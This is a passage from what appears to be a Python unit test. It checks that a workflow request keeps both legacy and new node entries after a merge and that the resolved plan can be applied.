        wf = WorkflowRequest.model_validate(raw)

        # Both forms survive the merge — legacy entries come first.
        assert [n.node_type_id for n in wf.nodes] == ["old-pipe", "new-node"]

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        assert plan.can_apply is True
